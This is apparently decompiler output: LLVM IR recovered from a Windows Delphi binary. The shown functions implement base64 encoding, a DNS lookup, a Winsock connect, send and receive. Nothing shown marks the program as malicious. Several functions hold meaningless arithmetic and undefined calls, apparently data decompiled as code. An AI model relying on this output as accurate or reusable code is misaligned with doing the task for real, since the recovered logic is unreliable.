define i32 @function_4058ca() local_unnamed_addr {
dec_label_pc_4058ca:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !926
}

define i32 @function_4058cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4058cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !927
}

define i32 @function_4058d0() local_unnamed_addr {
dec_label_pc_4058d0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !928
  %2 = add i32 %1, -1, !insn.addr !928
  store i32 %2, i32* @global_var_4096b4, align 4, !insn.addr !928
  ret i32 %0, !insn.addr !929
}

define i32 @function_4058db(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4058db:
  %storemerge.reg2mem = alloca i32, !insn.addr !930
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !930
  %5 = inttoptr i32 %3 to i32*, !insn.addr !930
  store i32 %4, i32* %5, align 4, !insn.addr !930
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !931
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !931
  %10 = add i8 %7, %9, !insn.addr !931
  %11 = inttoptr i32 %8 to i8*, !insn.addr !931
  store i8 %10, i8* %11, align 1, !insn.addr !931
  %12 = load i32, i32* %eax, align 4, !insn.addr !932
  store i32 %arg1, i32* %eax, align 4, !insn.addr !933
  %13 = add i32 %12, 99, !insn.addr !934
  %14 = inttoptr i32 %13 to i64*, !insn.addr !934
  %15 = load i64, i64* %14, align 4, !insn.addr !934
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !934
  %17 = add i32 %16, -2, !insn.addr !935
  %18 = inttoptr i32 %17 to i16*, !insn.addr !935
  store i16 27241, i16* %18, align 2, !insn.addr !935
  %19 = mul i32 %2, 2, !insn.addr !936
  %20 = add i32 %2, 110, !insn.addr !936
  %21 = add i32 %20, %19, !insn.addr !936
  %22 = inttoptr i32 %21 to i32*, !insn.addr !936
  %23 = load i32, i32* %22, align 4, !insn.addr !936
  %24 = sext i32 %23 to i64, !insn.addr !936
  %25 = mul nsw i64 %24, 111, !insn.addr !936
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !936
  %28 = icmp eq i64 %25, %27, !insn.addr !936
  br i1 %28, label %dec_label_pc_40590d, label %dec_label_pc_40597c, !insn.addr !937

dec_label_pc_40590d:                              ; preds = %dec_label_pc_4058db
  %29 = icmp eq i32 %0, 0, !insn.addr !938
  br i1 %29, label %dec_label_pc_405984, label %dec_label_pc_405911, !insn.addr !939

dec_label_pc_405911:                              ; preds = %dec_label_pc_40590d
  %30 = icmp slt i32 %0, 0, !insn.addr !938
  br i1 %30, label %dec_label_pc_40598c, label %dec_label_pc_405913, !insn.addr !940

dec_label_pc_405913:                              ; preds = %dec_label_pc_405911
  %31 = trunc i32 %0 to i8, !insn.addr !938
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !685, !insn.addr !938
  %33 = and i8 %32, 1, !insn.addr !938
  %34 = icmp eq i8 %33, 0, !insn.addr !938
  br i1 %34, label %dec_label_pc_405945, label %dec_label_pc_405915, !insn.addr !941

dec_label_pc_405915:                              ; preds = %dec_label_pc_405913
  %35 = add i32 %12, -1, !insn.addr !932
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !942
  %37 = load i32, i32* %36, align 4, !insn.addr !942
  %38 = xor i32 %37, %1, !insn.addr !942
  store i32 %38, i32* %36, align 4, !insn.addr !942
  %39 = add i32 %1, 959985462, !insn.addr !943
  %40 = inttoptr i32 %39 to i32*, !insn.addr !943
  %41 = load i32, i32* %40, align 4, !insn.addr !943
  %42 = xor i32 %41, %1, !insn.addr !943
  %43 = add i32 %16, -38, !insn.addr !944
  %44 = inttoptr i32 %43 to i32*, !insn.addr !944
  store i32 %35, i32* %44, align 4, !insn.addr !944
  %45 = add i32 %16, -42, !insn.addr !945
  %46 = inttoptr i32 %45 to i32*, !insn.addr !945
  store i32 %42, i32* %46, align 4, !insn.addr !945
  %47 = add i32 %16, -22, !insn.addr !946
  %48 = inttoptr i32 %47 to i32*, !insn.addr !946
  store i32 0, i32* %48, align 4, !insn.addr !946
  %49 = add i32 %16, -26, !insn.addr !947
  %50 = inttoptr i32 %49 to i32*, !insn.addr !947
  store i32 0, i32* %50, align 4, !insn.addr !947
  %51 = add i32 %16, -30, !insn.addr !948
  %52 = inttoptr i32 %51 to i32*, !insn.addr !948
  store i32 0, i32* %52, align 4, !insn.addr !948
  %53 = add i32 %16, -34, !insn.addr !949
  %54 = inttoptr i32 %53 to i32*, !insn.addr !949
  store i32 0, i32* %54, align 4, !insn.addr !949
  %55 = add i32 %16, -6, !insn.addr !950
  %56 = inttoptr i32 %55 to i32*, !insn.addr !950
  store i32 %arg3, i32* %56, align 4, !insn.addr !950
  %57 = add i32 %16, -46, !insn.addr !951
  %58 = inttoptr i32 %57 to i32*, !insn.addr !951
  store i32 %17, i32* %58, align 4, !insn.addr !951
  ret i32 0, !insn.addr !951

dec_label_pc_405945:                              ; preds = %dec_label_pc_405913
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !952
  %60 = trunc i64 %25 to i32, !insn.addr !936
  %61 = load i32, i32* %eax, align 4, !insn.addr !953
  %62 = add i32 %61, 1, !insn.addr !953
  %63 = mul i32 %59, 8, !insn.addr !954
  %64 = add i32 %59, 48, !insn.addr !954
  %65 = add i32 %64, %63, !insn.addr !954
  %66 = inttoptr i32 %65 to i8*, !insn.addr !954
  %67 = load i8, i8* %66, align 4, !insn.addr !954
  %68 = udiv i32 %62, 256, !insn.addr !954
  %69 = trunc i32 %68 to i8, !insn.addr !954
  %70 = add i8 %67, %69, !insn.addr !954
  store i8 %70, i8* %66, align 4, !insn.addr !954
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !955
  %71 = call i32 @"@LStrClr"(), !insn.addr !956
  %72 = call i32 @function_4034f4(), !insn.addr !957
  %73 = add i32 %60, -8, !insn.addr !958
  %74 = inttoptr i32 %73 to i32*, !insn.addr !958
  store i32 %72, i32* %74, align 4, !insn.addr !958
  %75 = ashr i32 %72, 31, !insn.addr !959
  %76 = zext i32 %72 to i64, !insn.addr !960
  %77 = zext i32 %75 to i64, !insn.addr !960
  %78 = mul i64 %77, 4294967296, !insn.addr !960
  %79 = or i64 %78, %76, !insn.addr !960
  %80 = sdiv i64 %79, 3, !insn.addr !960
  %81 = trunc i64 %80 to i32, !insn.addr !960
  store i32 %81, i32* %eax, align 4, !insn.addr !960
  %82 = srem i64 %79, 3, !insn.addr !960
  %83 = trunc i64 %82 to i32, !insn.addr !960
  %84 = icmp eq i32 %83, 0, !insn.addr !961
  %85 = icmp eq i1 %84, false, !insn.addr !962
  br i1 %85, label %dec_label_pc_40597b, label %dec_label_pc_40596e, !insn.addr !962

dec_label_pc_40596e:                              ; preds = %dec_label_pc_405945
  %86 = load i32, i32* %74, align 4, !insn.addr !963
  %87 = ashr i32 %86, 31, !insn.addr !964
  %88 = zext i32 %86 to i64, !insn.addr !965
  %89 = zext i32 %87 to i64, !insn.addr !965
  %90 = mul i64 %89, 4294967296, !insn.addr !965
  %91 = or i64 %90, %88, !insn.addr !965
  %92 = sdiv i64 %91, 3, !insn.addr !965
  %93 = trunc i64 %92 to i32, !insn.addr !965
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !966
  br label %dec_label_pc_405988, !insn.addr !966

dec_label_pc_40597b:                              ; preds = %dec_label_pc_405945
  ret i32 %81, !insn.addr !966

dec_label_pc_40597c:                              ; preds = %dec_label_pc_4058db
  %94 = load i32, i32* %eax, align 4, !insn.addr !967
  ret i32 %94, !insn.addr !967

dec_label_pc_405984:                              ; preds = %dec_label_pc_40590d
  %95 = load i32, i32* %eax, align 4, !insn.addr !968
  %96 = zext i32 %95 to i64, !insn.addr !968
  %97 = zext i32 %arg3 to i64, !insn.addr !968
  %98 = mul i64 %97, 4294967296, !insn.addr !968
  %99 = or i64 %98, %96, !insn.addr !968
  %100 = zext i32 %arg2 to i64, !insn.addr !968
  %101 = sdiv i64 %99, %100, !insn.addr !968
  %102 = trunc i64 %101 to i32, !insn.addr !968
  %103 = add i32 %102, 1, !insn.addr !969
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !969
  br label %dec_label_pc_405988, !insn.addr !969

dec_label_pc_405988:                              ; preds = %dec_label_pc_40596e, %dec_label_pc_405984
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !970
  ret i32 %104, !insn.addr !971

dec_label_pc_40598c:                              ; preds = %dec_label_pc_405911
  %105 = inttoptr i32 %1 to i32*, !insn.addr !972
  %106 = load i32, i32* %105, align 4, !insn.addr !972
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !972
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !973
  %109 = load i32, i32* %108, align 4, !insn.addr !973
  %110 = add i32 %109, %107, !insn.addr !973
  store i32 %110, i32* %108, align 4, !insn.addr !973
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !974
  %113 = inttoptr i32 %112 to i8*, !insn.addr !974
  %114 = load i8, i8* %113, align 1, !insn.addr !974
  %115 = trunc i32 %111 to i8, !insn.addr !974
  %116 = add i8 %114, %115, !insn.addr !974
  store i8 %116, i8* %113, align 1, !insn.addr !974
  %117 = load i32, i32* %eax, align 4, !insn.addr !975
  ret i32 %117, !insn.addr !975
}

define i32 @function_405994() local_unnamed_addr {
dec_label_pc_405994:
  %ebx.0.reg2mem = alloca i32, !insn.addr !976
  %esp.0.reg2mem = alloca i32, !insn.addr !976
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !977
  %3 = inttoptr i32 %2 to i32*, !insn.addr !977
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !978
  %13 = inttoptr i32 %12 to i32*, !insn.addr !978
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !976
  br label %dec_label_pc_405996, !insn.addr !976

dec_label_pc_405996:                              ; preds = %dec_label_pc_405ae1, %dec_label_pc_405994
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !979
  %25 = add i32 %24, 3, !insn.addr !980
  %26 = load i32, i32* %3, align 4, !insn.addr !977
  %27 = icmp sgt i32 %25, %26, !insn.addr !981
  br i1 %27, label %dec_label_pc_405a36, label %dec_label_pc_4059a7, !insn.addr !981

dec_label_pc_4059a7:                              ; preds = %dec_label_pc_405996
  %28 = add i32 %24, %0, !insn.addr !982
  %29 = inttoptr i32 %28 to i8*, !insn.addr !982
  %30 = load i8, i8* %29, align 1, !insn.addr !982
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !983
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !984
  %34 = inttoptr i32 %33 to i8*, !insn.addr !984
  %35 = load i8, i8* %34, align 1, !insn.addr !984
  store i8 %35, i8* %5, align 1, !insn.addr !985
  %36 = load i8, i8* %29, align 1, !insn.addr !986
  %37 = mul i8 %36, 16, !insn.addr !987
  %38 = and i8 %37, 48, !insn.addr !988
  %39 = add i32 %28, 1, !insn.addr !989
  %40 = inttoptr i32 %39 to i8*, !insn.addr !989
  %41 = load i8, i8* %40, align 1, !insn.addr !989
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !990
  %44 = zext i8 %43 to i32, !insn.addr !990
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !991
  %46 = inttoptr i32 %45 to i8*, !insn.addr !991
  %47 = load i8, i8* %46, align 1, !insn.addr !991
  store i8 %47, i8* %7, align 1, !insn.addr !992
  %48 = load i8, i8* %40, align 1, !insn.addr !993
  %49 = mul i8 %48, 4, !insn.addr !994
  %50 = and i8 %49, 60, !insn.addr !995
  %51 = add i32 %28, 2, !insn.addr !996
  %52 = inttoptr i32 %51 to i8*, !insn.addr !996
  %53 = load i8, i8* %52, align 1, !insn.addr !996
  %54 = udiv i8 %53, 64, !insn.addr !997
  %55 = or i8 %54, %50, !insn.addr !998
  %56 = zext i8 %55 to i32, !insn.addr !998
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !999
  %58 = inttoptr i32 %57 to i8*, !insn.addr !999
  %59 = load i8, i8* %58, align 1, !insn.addr !999
  store i8 %59, i8* %9, align 1, !insn.addr !1000
  %60 = and i8 %53, 63, !insn.addr !1001
  %61 = zext i8 %60 to i32, !insn.addr !1001
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !1002
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1002
  %64 = load i8, i8* %63, align 1, !insn.addr !1002
  store i8 %64, i8* %11, align 1, !insn.addr !1003
  br label %dec_label_pc_405ae1, !insn.addr !1004

dec_label_pc_405a36:                              ; preds = %dec_label_pc_405996
  %65 = add i32 %24, 2, !insn.addr !1005
  %66 = icmp sgt i32 %65, %26, !insn.addr !1006
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_405aa5, label %dec_label_pc_405a40, !insn.addr !1006

dec_label_pc_405a40:                              ; preds = %dec_label_pc_405a36
  %76 = mul i8 %75, 16, !insn.addr !1007
  %77 = and i8 %76, 48, !insn.addr !1008
  %78 = add i32 %67, 1, !insn.addr !1009
  %79 = inttoptr i32 %78 to i8*, !insn.addr !1009
  %80 = load i8, i8* %79, align 1, !insn.addr !1009
  %81 = zext i8 %80 to i32, !insn.addr !1009
  %82 = udiv i8 %80, 16, !insn.addr !1010
  %83 = or i8 %82, %77, !insn.addr !1011
  %84 = zext i8 %83 to i32, !insn.addr !1011
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !1012
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1012
  %87 = load i8, i8* %86, align 1, !insn.addr !1012
  store i8 %87, i8* %7, align 1, !insn.addr !1013
  %88 = mul i32 %81, 4, !insn.addr !1014
  %89 = and i32 %88, 60, !insn.addr !1015
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !1016
  %91 = inttoptr i32 %90 to i8*, !insn.addr !1016
  %92 = load i8, i8* %91, align 4, !insn.addr !1016
  store i8 %92, i8* %9, align 1, !insn.addr !1017
  store i8 61, i8* %11, align 1, !insn.addr !1018
  br label %dec_label_pc_405ae1, !insn.addr !1019

dec_label_pc_405aa5:                              ; preds = %dec_label_pc_405a36
  %93 = zext i8 %75 to i32, !insn.addr !1020
  %94 = mul i32 %93, 16, !insn.addr !1021
  %95 = and i32 %94, 48, !insn.addr !1022
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !1023
  %97 = inttoptr i32 %96 to i8*, !insn.addr !1023
  %98 = load i8, i8* %97, align 16, !insn.addr !1023
  store i8 %98, i8* %7, align 1, !insn.addr !1024
  store i8 61, i8* %9, align 1, !insn.addr !1025
  store i8 61, i8* %11, align 1, !insn.addr !1026
  br label %dec_label_pc_405ae1, !insn.addr !1026

dec_label_pc_405ae1:                              ; preds = %dec_label_pc_405aa5, %dec_label_pc_405a40, %dec_label_pc_4059a7
  %99 = load i32, i32* %13, align 4, !insn.addr !978
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1027
  %101 = load i32, i32* %100, align 4, !insn.addr !1027
  %102 = add i32 %esp.0.reload, -4, !insn.addr !1027
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1027
  store i32 %101, i32* %103, align 4, !insn.addr !1027
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !1028
  %105 = load i32, i32* %15, align 4, !insn.addr !1029
  %106 = add i32 %esp.0.reload, -8, !insn.addr !1029
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1029
  store i32 %105, i32* %107, align 4, !insn.addr !1029
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !1030
  %109 = load i32, i32* %17, align 4, !insn.addr !1031
  %110 = add i32 %esp.0.reload, -12, !insn.addr !1031
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !1031
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !1032
  %113 = load i32, i32* %19, align 4, !insn.addr !1033
  %114 = add i32 %esp.0.reload, -16, !insn.addr !1033
  %115 = inttoptr i32 %114 to i32*, !insn.addr !1033
  store i32 %113, i32* %115, align 4, !insn.addr !1033
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !1034
  %117 = load i32, i32* %21, align 4, !insn.addr !1035
  %118 = add i32 %esp.0.reload, -20, !insn.addr !1035
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !1035
  %120 = call i32 @"@LStrCatN"(), !insn.addr !1036
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !1037
  %122 = load i32, i32* %23, align 4, !insn.addr !1038
  %123 = add i32 %122, -1, !insn.addr !1038
  %124 = icmp eq i32 %123, 0, !insn.addr !1038
  store i32 %123, i32* %23, align 4, !insn.addr !1038
  %125 = icmp eq i1 %124, false, !insn.addr !1039
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !1039
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !1039
  br i1 %125, label %dec_label_pc_405996, label %dec_label_pc_405b35, !insn.addr !1039

dec_label_pc_405b35:                              ; preds = %dec_label_pc_405ae1
  %126 = load i32, i32* %119, align 4, !insn.addr !1040
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !1041
  store i32 4217687, i32* %111, align 4, !insn.addr !1042
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !1043
  ret i32 %127, !insn.addr !1044
}

define i32 @function_405b50() local_unnamed_addr {
dec_label_pc_405b50:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1045
  ret i32 %0, !insn.addr !1045
}

define i32 @function_405b55() local_unnamed_addr {
dec_label_pc_405b55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1046
}

define i32 @function_405b57(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405b57:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1047
}

define i32 @function_405b60() local_unnamed_addr {
dec_label_pc_405b60:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !1048
  %0 = call i32 @function_4036f4(), !insn.addr !1049
  %1 = inttoptr i32 %0 to i8*, !insn.addr !1050
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !1051
  %3 = call i32 @"@FillChar"(), !insn.addr !1052
  %4 = icmp eq %hostent* %2, null, !insn.addr !1053
  br i1 %4, label %dec_label_pc_405bab, label %dec_label_pc_405b89, !insn.addr !1054

dec_label_pc_405b89:                              ; preds = %dec_label_pc_405b60
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !1051
  %6 = add i32 %5, 12, !insn.addr !1055
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1055
  %8 = load i32, i32* %7, align 4, !insn.addr !1055
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1056
  %10 = load i32, i32* %9, align 4, !insn.addr !1056
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1057
  %12 = load i8, i8* %11, align 1, !insn.addr !1057
  %13 = sext i8 %12 to i32, !insn.addr !1058
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !1059
  br label %dec_label_pc_405bab, !insn.addr !1059

dec_label_pc_405bab:                              ; preds = %dec_label_pc_405b89, %dec_label_pc_405b60
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !1060
}

define i32 @function_405bbc() local_unnamed_addr {
dec_label_pc_405bbc:
  %esp.0.reg2mem = alloca i32, !insn.addr !1061
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036e4(), !insn.addr !1062
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1063
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !1063
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !1063
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1064
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !1065
  %5 = trunc i32 %4 to i16, !insn.addr !1065
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !1066
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !1067
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !1067
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !1068
  %9 = icmp eq i32 %8, -1, !insn.addr !1069
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1070
  br i1 %9, label %dec_label_pc_405c4a, label %dec_label_pc_405c0b, !insn.addr !1070

dec_label_pc_405c0b:                              ; preds = %dec_label_pc_405bbc
  %10 = call i32 @function_405b60(), !insn.addr !1071
  %11 = trunc i32 %10 to i16, !insn.addr !1072
  %12 = call i16 @htons(i16 %11), !insn.addr !1072
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !1073
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1073
  %14 = sext i16 %12 to i32, !insn.addr !1074
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1074
  %16 = icmp eq i32 %15, 0, !insn.addr !1075
  %17 = icmp eq i1 %16, false, !insn.addr !1076
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !1076
  br i1 %17, label %dec_label_pc_405c4a, label %dec_label_pc_405c42, !insn.addr !1076

dec_label_pc_405c42:                              ; preds = %dec_label_pc_405c0b
  %18 = inttoptr i32 %0 to i32*, !insn.addr !1077
  store i32 %8, i32* %18, align 4, !insn.addr !1077
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !1078
  br label %dec_label_pc_405c4a, !insn.addr !1078

dec_label_pc_405c4a:                              ; preds = %dec_label_pc_405c42, %dec_label_pc_405c0b, %dec_label_pc_405bbc
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1079
  %20 = load i32, i32* %19, align 4, !insn.addr !1079
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !1080
  %21 = add i32 %esp.0.reload, 8, !insn.addr !1081
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1081
  store i32 4217959, i32* %22, align 4, !insn.addr !1081
  %23 = call i32 @"@LStrClr"(), !insn.addr !1082
  ret i32 %23, !insn.addr !1083
}

define i32 @function_405c60() local_unnamed_addr {
dec_label_pc_405c60:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1084
  ret i32 %0, !insn.addr !1084
}

define i32 @function_405c65() local_unnamed_addr {
dec_label_pc_405c65:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1085
}

define i32 @function_405c67(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405c67:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1086
}

define i32 @function_405c70() local_unnamed_addr {
dec_label_pc_405c70:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !1087
  %2 = call i32 @WSACleanup(), !insn.addr !1088
  ret i32 %2, !insn.addr !1089
}

define i32 @function_405c7c() local_unnamed_addr {
dec_label_pc_405c7c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036e4(), !insn.addr !1090
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1091
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !1091
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !1091
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1092
  %4 = call i32 @function_4036f4(), !insn.addr !1093
  %5 = call i32 @StrCopy(), !insn.addr !1094
  %6 = call i32 @function_407524(i32 4), !insn.addr !1095
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1096
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !1097
  %9 = call i32 @"@LStrClr"(), !insn.addr !1098
  ret i32 %9, !insn.addr !1099
}

define i32 @function_405ced() local_unnamed_addr {
dec_label_pc_405ced:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1100
  ret i32 %0, !insn.addr !1100
}

define i32 @function_405cf2() local_unnamed_addr {
dec_label_pc_405cf2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1101
}

define i32 @function_405cf4(i32 %arg1) local_unnamed_addr {
dec_label_pc_405cf4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1102
}

define i32 @function_405cfc() local_unnamed_addr {
dec_label_pc_405cfc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1103
  %2 = call i32 @StrPas(), !insn.addr !1104
  ret i32 %2, !insn.addr !1105
}

define i32 @function_405d28(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405d28:
  %esp.1.reg2mem = alloca i32, !insn.addr !1106
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1106
  %esp.0.reg2mem = alloca i32, !insn.addr !1106
  %ecx.0.reg2mem = alloca i32, !insn.addr !1106
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1107
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !1108
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1108
  br label %dec_label_pc_405d31, !insn.addr !1108

dec_label_pc_405d31:                              ; preds = %dec_label_pc_405d31, %dec_label_pc_405d28
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1109
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1109
  store i32 0, i32* %2, align 4, !insn.addr !1109
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1110
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1110
  store i32 0, i32* %4, align 4, !insn.addr !1110
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1111
  %6 = icmp eq i32 %5, 0, !insn.addr !1111
  %7 = icmp eq i1 %6, false, !insn.addr !1112
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1112
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1112
  br i1 %7, label %dec_label_pc_405d31, label %dec_label_pc_405d38, !insn.addr !1112

dec_label_pc_405d38:                              ; preds = %dec_label_pc_405d31
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1113
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1113
  store i32 0, i32* %9, align 4, !insn.addr !1113
  %10 = call i32 @function_4036e4(), !insn.addr !1114
  %11 = call i32 @function_4036e4(), !insn.addr !1115
  %12 = call i32 @function_4036e4(), !insn.addr !1116
  %13 = call i32 @function_4036e4(), !insn.addr !1117
  %14 = call i32 @function_4036e4(), !insn.addr !1118
  %15 = call i32 @function_4036e4(), !insn.addr !1119
  %16 = call i32 @function_4036e4(), !insn.addr !1120
